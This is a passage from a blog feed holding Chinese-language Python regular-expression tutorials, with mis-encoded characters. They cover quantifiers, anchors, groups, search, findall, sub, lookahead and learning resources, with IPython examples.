re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45a68&#x27;</span>).group()</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">18</span>-c9758e381471&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…45a68&#x27;</span>).group()</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…a&#123;4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">27</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">28</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…a&#123;1,4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">28</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;é€Ÿåº¦ä¸æ¿€æƒ…a&#123;1,4&#125;&#x27;</span>, <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;é€Ÿåº¦ä¸æ¿€æƒ…aaa&#x27;</span></span><br></pre></td></tr></table></figure><p>? å‰é¢çš„å­—ç¬¦å‡ºç°ä¸€æ¬¡æˆ–é›¶æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">33</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;021-?\d&#123;8&#125;&#x27;</span>, <span class="string">&#x27;021-12345678&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">33</span>]: <span class="string">&#x27;021-12345678&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;021-?\d&#123;8&#125;&#x27;</span>, <span class="string">&#x27;02112345678&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">34</span>]: <span class="string">&#x27;02112345678&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¸‰ä¸ªåŒå¼•å·æ˜¯å­—ç¬¦ä¸²ï¼Œæ”¾åœ¨å‡½æ•°ä¸‹é¢ï¼Œå¯ä»¥å½“ä½œå‡½æ•°çš„è¯´æ˜ã€‚æ”¾åˆ°ç±»çš„ä¸‹é¢ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç±»çš„è¯´æ˜ã€‚</p><p>è¦æƒ³åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ ï¼Œå¯ä»¥ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">52</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;.*&#x27;</span>,html_content,re.S).group()</span><br></pre></td></tr></table></figure><p>å•ç‹¬ä½¿ç”¨ <code>.*</code>åªèƒ½åŒ¹é…å•è¡Œæ‰€æœ‰å­—ç¬¦ï¼ˆæœ‰æ— ï¼‰ï¼Œä¸€æ—¦é‡åˆ°æ¢è¡Œç¬¦å°±åœæ­¢åŒ¹é…äº†ã€‚å¯ä»¥åŠ ä¸€ä¸ªå‚æ•°<code>re.S</code></p><p>+ ä¸ * çš„åŒºåˆ«ï¼š å‰è€…ä¸èƒ½åŒ¹é… ç©ºå­—ç¬¦ï¼Œåè€…å¯ä»¥åŒ¹é…ç©ºå­—ç¬¦</p><h1 id="ä½ç½®é”šå®š">6. ä½ç½®é”šå®š</h1><table><thead><tr class="header"><th style="text-align: center;">å­—ç¬¦</th><th style="text-align: left;">åŠŸèƒ½</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">^</td><td style="text-align: left;">åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´</td></tr><tr class="even"><td style="text-align: center;">$</td><td style="text-align: left;">åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾</td></tr></tbody></table><p>é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œâ€œerå¯ä»¥åŒ¹é…â€œneverâ€ä¸­çš„â€œerâ€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œverbâ€ä¸­çš„â€œerâ€ã€‚åŒ¹é…éå•è¯è¾¹ç•Œã€‚â€œä¾‹å¦‚ï¼šerâ€èƒ½åŒ¹é…â€œverbâ€ä¸­çš„â€œerâ€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œneverâ€ä¸­çš„â€œerâ€ã€‚</p><p>ä¸ºä»€ä¹ˆä¸å†™^ ä¹Ÿèƒ½åŒ¹é…å¼€å¤´ï¼Œå› ä¸º python çš„ matchå‡½æ•°**è‡ªåŠ¨**ä»å¼€å¤´å¼€å§‹åŒ¹é…ï¼Œä½†æ˜¯ä¸ä¼šé»˜è®¤è‡ªåŠ¨åŒ¹é…åˆ°ç»“å°¾ã€‚ä½†æ˜¯å…¶ä»–è¯­è¨€çš„å‡½æ•°ä¸ä¸€å®šè¿™æ ·åšã€‚æ‰€ä»¥å¦‚æœæƒ³è¦åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²çš„è¿˜ï¼Œä¸€èˆ¬å¼€å¤´å†™ä¸Š^, ç»“å°¾å†™ä¸Š $</p><p>æ¯”å¦‚ï¼šåˆ¤æ–­å˜é‡åæ˜¯å¦æœ‰æ•ˆ é—®é¢˜ä¸­ï¼Œä»¥ä¸‹ä»£ç å°±ä¸èƒ½åˆ¤æ–­ç±»ä¼¼ï¼šâ€˜a#ssâ€™ç­‰åœ¨ä¸­é—´å‡ºç°ä¸æ­£å¸¸å­—ç¬¦çš„å˜é‡å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;[a-zA-Z_][\w]*&#x27;</span>, name)</span><br></pre></td></tr></table></figure><p>æ”¹æˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z_][\w]*$&#x27;</span>, name)</span><br></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šåŒ¹é… 4-13 ä¸ªå‰ç¼€ï¼ˆå­—æ¯æ•°å­—ä¸‹åˆ’çº¿ï¼‰å¹¶ä»¥@163.comç»“å°¾çš„é‚®ç®±ï¼Œæ­£åˆ™ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_]&#123;4,20&#125;@163\.com$&#x27;</span>, mail)</span><br></pre></td></tr></table></figure><p>âš ï¸ æ³¨æ„ï¼š</p><ol type="1"><li>å¦‚æœè¦å…¨å­—ç¬¦ä¸²åŒ¹é…ï¼Œä¸è¦å¿˜è®°åœ¨æœ€åä½¿ç”¨ $ ç¬¦å·</li><li>å¦‚æœè¦åœ¨å­—ç¬¦ä¸²ä¸­åŒ¹é…é‚£äº›æ­£åˆ™è¡¨è¾¾å¼ç”¨åˆ°çš„å­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰ã€‚</li></ol><h1 id="åŒ¹é…åˆ†ç»„">7. åŒ¹é…åˆ†ç»„</h1><table><thead><tr class="header"><th style="text-align: center;">å­—ç¬¦</th><th style="text-align: left;">åŠŸèƒ½</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">|</td><td style="text-align: left;">åŒ¹é…å·¦å³ä»»æ„ä¸€ä¸ªè¡¨è¾¾å¼</td></tr><tr class="even"><td style="text-align: center;">(ab)</td><td style="text-align: left;">å°†æ‹¬å·ä¸­å­—ç¬¦ä½œä¸ºä¸€ä¸ªåˆ†ç»„</td></tr><tr class="odd"><td style="text-align: center;"><code>\num</code></td><td style="text-align: left;">å¼•ç”¨åˆ†ç»„ num åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</td></tr><tr class="even"><td style="text-align: center;"><code>(?P)</code></td><td style="text-align: left;">åˆ†ç»„èµ·åˆ«å</td></tr><tr class="odd"><td style="text-align: center;">(?P=name)</td><td style="text-align: left;">å¼•ç”¨åˆ«åä¸º name åˆ†ç»„åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</td></tr></tbody></table><p>å°æ‹¬å·æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ol type="1"><li><p>åˆ†ç»„åŒ¹é…</p></li><li><p>å•ç‹¬å–å‡ºå°æ‹¬å·ä¸­çš„å€¼</p><p>æƒ³è¦å–æŸä¸ªä½ç½®çš„å€¼ï¼Œå°±ç»™å®ƒåŠ ä¸ªæ‹¬å·ã€‚æƒ³è¦å–ç¬¬ n ä¸ªæ‹¬å·é‡Œé¢çš„ä¸œè¥¿ï¼Œå°±ç”¨group(n).</p><p>å¦‚æœæ‹¬å·çš„ä¸ªæ•°ä¸º mï¼Œä½ ç”¨ group(m+1) ä¼šå¼•å‘å¼‚å¸¸ã€‚</p></li></ol><p>æ³¨æ„ï¼šæµ‹è¯•è¿‡ç¨‹ä¸­ä¸ºäº†ç®€æ´èµ·è§ï¼Œæœ‰æ—¶ä¼šä½¿ç”¨ re.match().group()è¿™æ ·çš„å†™æ³•ã€‚æ­£å¸¸å¼€å‘ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦åˆ†å¼€å†™ã€‚å› ä¸ºå‰è€…ä¼šäº§ç”Ÿå¼‚å¸¸ã€‚</p><p>å¯¹ä¸Šæ¬¡å†™çš„åŒ¹é…é‚®ç®±çš„æ­£åˆ™è¿›è¡Œæ”¹è¿›ï¼ŒåŒ¹é…å¤šç§é‚®ç®±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_]&#123;4,20&#125;@(qq|outlook|163|gmail|126)\.com$&#x27;</span>, mail)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚æœä¸å†™æ‹¬å·ï¼Œé‚£ç¨‹åºä¼šé»˜è®¤å°† |å‰åçš„ä¸¤å¤§éƒ¨åˆ†çœ‹æˆä¸¤ä¸ªåˆ†ç»„ï¼Œè€Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p><p>åˆ†ç»„çš„å¦ä¸€ä¸ªåº”ç”¨ï¼š</p><p>åˆ¤æ–­ html_str = "<code>&lt;h1&gt;hello wrold&lt;/h1&gt;</code>"ä¸­å¼€é—­æ ‡ç­¾æ˜¯å¦é…å¯¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(\w*)&gt;.*&lt;/\1&gt;&#x27;</span>,html_str)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæƒ³å–æŸä¸ªä½ç½®çš„å€¼ï¼Œæ‰€ä»¥ç»™ä»–åŠ ä¸Šåˆ†ç»„ ()ï¼Œç„¶ååé¢ä½¿ç”¨çš„æ—¶å€™ï¼Œçœ‹ä»–æ˜¯ç¬¬å‡ ä¸ªåˆ†ç»„ï¼Œå°±ç”¨ <code>\å‡ </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]:  html_str=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(\w*)&gt;&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1&gt;&#x27;</span>,html_str)</span><br><span class="line">Out[<span class="number">10</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">27</span>), <span class="keyword">match</span>=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…å½“åˆ†ç»„è¿‡å¤šæ—¶ï¼Œæ•°æ•°å¹¶ä¸æ–¹é¢ï¼Œå¯ä»¥ä½¿ç”¨åˆ«åï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(?P&lt;p1&gt;\w*)&gt;&lt;(?P&lt;p2&gt;\w*)&gt;.*&lt;/(?P=p2)&gt;&lt;/(?P=p1)&gt;&#x27;</span>,html_str)</span><br><span class="line">Out[<span class="number">17</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">27</span>), <span class="keyword">match</span>=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="re-æ¨¡å—çš„é«˜çº§ç”¨æ³•">8. re æ¨¡å—çš„é«˜çº§ç”¨æ³•</h1><p>ä¸Šé¢çš„å¤§éƒ¨åˆ†æ­£åˆ™çŸ¥è¯†ï¼Œåœ¨å…¶ä»–è¯­è¨€ä¸­åŸºæœ¬éƒ½æœ‰ã€‚è€Œè¿™ä¸€èŠ‚ â€˜reæ¨¡å—çš„é«˜çº§ç”¨æ³•â€™æ˜¯ python ç‰¹æœ‰çš„ï¼Œå…¶ä»–çš„è¯­è¨€å¯èƒ½æ²¡æœ‰ã€‚</p><h2 id="search">8.1. search()</h2><p>match() æ˜¯é»˜è®¤è¦æ±‚ä»å¤´å¼€å§‹åŒ¹é…ï¼Œè€Œ searchä¸æ˜¯ï¼Œå®ƒåªæ˜¯åŒ¹é…å­—ä¸²ä¸­<strong>ç¬¬ä¸€æ¬¡</strong>å‡ºç°ç¬¦åˆæ­£åˆ™åŒ¹é…é¡¹çš„å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: re.search(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;é˜…è¯»æ¬¡æ•°:7887, ç‚¹èµæ•°:454&quot;</span>).group()</span><br><span class="line">Out[<span class="number">28</span>]: <span class="string">&#x27;7887&#x27;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œåœ¨ search çš„æ­£åˆ™ä¸­åŠ ä¸Š ^ï¼Œå°±å’Œ match ä¸€æ ·äº†ã€‚</p><h2 id="findall">8.2. findall()</h2><p>search æ˜¯åªåŒ¹é…ç¬¦åˆæ­£åˆ™çš„ç¬¬ä¸€ä¸ªå­—ä¸²ï¼Œè€Œ findallæ˜¯è¿”å›æ‰€æœ‰åŒ¹é…æ­£åˆ™çš„æ•°æ®ï¼Œè¿”å›å€¼ä¸ºåˆ—è¡¨ã€‚</p><p>ä¸€èˆ¬åœ¨ç½‘é¡µæ‰¹é‡è·å–ç‰¹å®šæ ¼å¼çš„æ•°æ®æ—¶ï¼Œç»å¸¸ä½¿ç”¨å®ƒ</p><p><strong>âš ï¸ï¼šè·å– findall çš„è¿”å›ç»“æœä¸éœ€è¦ä½¿ç”¨ group()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">73</span>]: re.findall(<span class="string">r&#x27;\d+&#x27;</span>,<span class="string">&#x27;python = 999, c = 22,c++ = 1212&#x27;</span>)</span><br><span class="line">Out[<span class="number">73</span>]: [<span class="string">&#x27;999&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;1212&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="sub">8.3. sub()</h2><ol type="1"><li>å°†æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„æ•°æ®ï¼Œæ›¿æ¢ä¸ºä½ è¾“å…¥çš„å‚æ•°å€¼</li><li>æ”¯æŒå‡½æ•°è°ƒç”¨</li></ol><p>åŒ¹é…æ›¿æ¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">74</span>]: re.sub(<span class="string">r&#x27;\d+&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;python = 999, c = 22,c++ = 1212&#x27;</span>)</span><br><span class="line">Out[<span class="number">74</span>]: <span class="string">&#x27;python = hello, c = hello,c++ = hello&#x27;</span></span><br></pre></td></tr></table></figure><p>å‡½æ•°è°ƒç”¨ï¼š</p><p>åŒ¹é…åˆ°ç¬¦åˆæ¡ä»¶çš„å­—ä¸²æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨å‡½æ•°ã€‚å°†æ­£åˆ™åŒ¹é…çš„è¿”å›å¯¹è±¡ä¼ åˆ°å‡½æ•°ä¸­ã€‚å¹¶æ¥å—è¯¥å‡½æ•°çš„è¿”å›å€¼æ¥æ›¿æ¢åŒ¹é…åˆ°çš„ä¸œè¥¿ã€‚</p><h2 id="split">8.4. split()</h2><p>æ ¹æ®åŒ¹é…è¿›è¡Œåˆ‡å‰²å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªåˆ—è¡¨ã€‚</p><p>ç»ƒä¹ ï¼šå°†å†’å·æˆ–ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œåˆ†å‰²å­—ç¬¦ä¸²ï¼šâ€œinfo:xiaoZhang 33shandongâ€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">reã€‚</span><br></pre></td></tr></table></figure><p>https://www.jianshu.com/p/9860f951616e</p><h2 id="look-ahead-look-behind">look ahead look behind</h2><p>å¸¸å¸¸ç”¨äºè®¡æ•°ï¼š <ahref="https://www.hackerrank.com/challenges/find-a-string/problem">Finda string</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    original_str = <span class="built_in">input</span>()</span><br><span class="line">    substring = <span class="built_in">input</span>()</span><br><span class="line">    a, b = substring[:-<span class="number">1</span>], substring[-<span class="number">1</span>]</span><br><span class="line">    pattern = <span class="string">rf&quot;<span class="subst">&#123;a&#125;</span>(?=<span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line">    matches = re.findall(pattern, original_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(matches))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæ­¤é¢˜ç›®æ›´é€‚åˆç”¨ç®€å•éå†åŒ¹é…è§£å†³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count_substring</span>(<span class="params">string, sub_string</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)):</span><br><span class="line">        <span class="keyword">if</span> (string[i:i+<span class="built_in">len</span>(sub_string)] == sub_string):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">sub=<span class="built_in">input</span>()</span><br><span class="line">count_substring(s, sub)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Regexp åŸç†ä¸è¯­æ³•</title>
      <link href="/blog/2021/06/16/programming/python/re_principle/"/>
      <url>/blog/2021/06/16/programming/python/re_principle/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡å¹¶æœªè¦†ç›– Pythonæ­£åˆ™çš„å…¨éƒ¨çŸ¥è¯†ï¼Œç½‘ä¸Šä¼˜ç§€çš„æ•™ç¨‹å¾ˆå¤šï¼Œæ— éœ€é‡å¤ï¼Œè¿™é‡Œåªè®°å½•ä¸€äº›æ˜“å¿˜ç‚¹ã€éš¾ç‚¹ä»¥åŠå¥½çš„ç´¢å¼•é“¾æ¥</p><h2 id="online-regexp-debug">Online RegExp Debug</h2><p><a href="https://www.regex101.com">regex101</a>æ³¨æ„æµ‹è¯•æ—¶ï¼Œåœ¨å³ä¾§çš„è¯­è¨€æ é€‰æ‹© Pyhton <ahref="https://www.debuggex.com">debuggex</a> <ahref="https://jex.im/regulex">JavaScript Regular ExpressionVisualizer.</a></p><h2 id="å¥½çš„èµ„æ–™">å¥½çš„èµ„æ–™</h2><p><ahref="https://learning.oreilly.com/videos/2018-python-regular/9781789539523">2018Python Regular Expressions - Real World Projects</a></p><p><ahref="https://github.com/ziishaned/learn-regex/blob/master/README.md">learn-regexthe easyest way</a></p><p>è¿™ä¸¤ä¸ªèµ„æ–™æˆ‘æ˜¯ä¾æ¬¡éƒ½çœ‹å®Œäº†çš„ã€‚ç¬¬ä¸€ä¸ªæ˜¯ oreillyçš„è¯¾ç¨‹ï¼Œæ·±å…¥æ½œå‡ºï¼Œæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å®Œæ•´åœ°å­¦å®Œä¸€å¥—è‹±æ–‡æ•™ç¨‹ï¼Œå¾ˆæ˜¯æ¬£å–œã€‚ç¬¬ä¸€ä¸ªæ•™ç¨‹(å‡ ä¹)æ²¡æœ‰è®² lookahead å’Œ lookbehind ç­‰ zero-width assertionçŸ¥è¯†ï¼Œå› æ­¤ï¼Œæˆ‘æ‰¾åˆ°ç¬¬äºŒä¸ªèµ„æ–™ï¼ŒæŠŠå®ƒçœ‹äº†ä¸€éã€‚</p><p>åªçœ‹æ•™ç¨‹ï¼Œä¸åŠ¨æ‰‹å­¦ä¸å¥½ï¼Œå¦‚æœæš‚æ—¶æ‰¾ä¸åˆ°å®é™…é¡¹ç›®ç”¨å¤„ï¼Œå¯ä»¥å…ˆåˆ·ä¸€åˆ·é¢˜ç›®ï¼Œå„å¤§åˆ·é¢˜ç½‘ç«™å‡å¯ï¼Œæˆ‘å½“æ—¶åˆ·çš„<ahref="https://www.hackerrank.com/">hackerrank</a>ï¼ˆä¸ºå•¥ï¼Ÿå› ä¸ºæˆ‘å½“æ—¶è°·æ­Œè‹±æ–‡æœç´¢æ­£åˆ™ç»ƒä¹ é¢˜ç›®çš„æ—¶å€™ï¼Œå®ƒæ’åœ¨å‰é¢ï¼Œå“ˆå“ˆ)</p><h2 id="python-regular-expression-terminology">Python Regular ExpressionTerminology</h2><ul><li>Pattern - A text pattern of interest expressed in Regular ExpressionLanguage</li><li>Text â€“ String in which to look for a match with a given pattern</li><li>Regex Engine - Regular Expression Engine that does the actualwork</li><li>Regex Module â€“ Python module for interacting with Regex Engine.</li></ul><p>Module: re</p><h2 id="åŸºæœ¬ä½¿ç”¨">åŸºæœ¬ä½¿ç”¨</h2><ol type="1"><li><p>re æ¨¡å—ç®€å•ä½¿ç”¨</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ...: hello 12 world</span></span><br><span class="line"><span class="string">    ...: Goodbye 224 world</span></span><br><span class="line"><span class="string">    ...: h yet anothet &#x27;h&#x27;</span></span><br><span class="line"><span class="string">    ...: &quot;&quot;&quot;</span></span><br><span class="line">In [<span class="number">15</span>]: pattern = <span class="string">r&quot;\d&#123;1,&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: match_obj = re.search(pattern, test)</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: <span class="built_in">print</span>(match_obj)</span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">7</span>, <span class="number">9</span>), <span class="keyword">match</span>=<span class="string">&#x27;12&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: <span class="built_in">print</span>(match_obj.group())</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure></p></li></ol><p>è¯¦ç»†çš„ Python æ­£åˆ™å‡½æ•°ä¸æ–¹æ³•çš„ä½¿ç”¨ç­‰åœ¨å¦ä¸€ç¯‡åšæ–‡å†™ã€‚</p><h2 id="åŸå§‹å­—ç¬¦ä¸²">åŸå§‹å­—ç¬¦ä¸²</h2><p>ä¸ºä»€ä¹ˆ pattern å†™çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åŸå§‹å­—ç¬¦ä¸²ï¼Ÿ</p><ul class="task-list"><li><label><input type="checkbox" />å†™æ¸…æ¥š</label></li></ul><p><a href="https://www.jianshu.com/p/21e2cfb7f829">Python ä¸­æœ‰å…³rawString(raw å­—ç¬¦ä¸²)çš„ç†è§£</a> <ahref="https://docs.python.org/2/library/re.html">7.2. re â€” Regularexpression operations</a></p><h2 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h2><h3 id="reserved-characters">Reserved characters</h3><ol type="1"><li><p>Reserved characters such as<code>&#123; &#125; [ ] / \ + * . $ ^ | ?</code> will not be reserverd in sets,which means there is no need to escape Reserved characters in sets.ä¾‹å¦‚, <code>[(+*)]</code> å°†åŒ¹é…ä»»ä½•æ–‡å­—å­—ç¬¦ '(' , '+' , '*' æˆ– ')'ã€‚</p></li><li><p>Reserved characters in group or Zero-width assertions still needto be escaped</p></li><li><p><code>|</code> An alternator at this position effectivelytruncates the entire pattern, rendering any other tokens beyond thispoint useless</p></li><li><p>å¼•å·å¹¶ä¸å½±å“ <code>\b</code>è¾¹ç•Œçš„åŒ¹é…ï¼Œå°±æ˜¯è¯´ï¼Œå³ä½¿ä¸€ä¸ªå•è¯æŒ¨ç€å¤šä¸ªå¼•å·ï¼Œæ­£åˆ™å¼•æ“ä¹Ÿä¼šæŠŠåŒ¹é…è¯¥å•è¯ã€‚</p></li><li><p><code>^ã€$</code>å°†é€ä¸ªè¾“å…¥ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåªä½œç”¨äºè¯¥å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ï¼Œå¦‚æœä½ æƒ³è¦æŠŠæ¯ä¸€è¡Œå•ç‹¬å¯¹å¾…ï¼ŒåŒ¹é…å®ƒä»¬çš„å¼€å¤´ï¼Œåˆ™éœ€è¦ä½¿ç”¨<code>m</code> flagå½“åŒ¹é…å¼€å¤´/ç»“å°¾æ—¶ï¼Œå¦‚æœæƒ³å°†æ¯è¡Œçš„å¼€å¤´/ç»“å°¾å•ç‹¬å‡ºæ¥çœ‹ï¼Œä¹Ÿå¯ä½¿ç”¨multi-mode inline option</p></li><li><p>å¯¹äºå–å, 